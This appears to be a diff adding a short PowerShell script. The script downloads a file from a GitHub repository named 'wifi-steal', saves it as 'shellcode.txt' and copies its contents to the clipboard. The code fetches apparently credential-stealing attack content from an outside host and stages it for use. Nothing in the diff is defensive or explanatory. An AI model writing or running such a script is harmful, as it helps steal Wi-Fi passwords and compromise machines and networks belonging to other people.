@@ -1,0 +1,6 @@
+$source = "https://raw.githubusercontent.com/SENLINE232/wifi-steal/main/wifi-steal"
+$destination = "shellcode.txt"
+$web = New-Object System.Net.WebClient
+$web.DownloadFile($source, $destination)
+$file = Get-Content -Path $destination -Encoding UTF8
+Set-Clipboard -Value $file
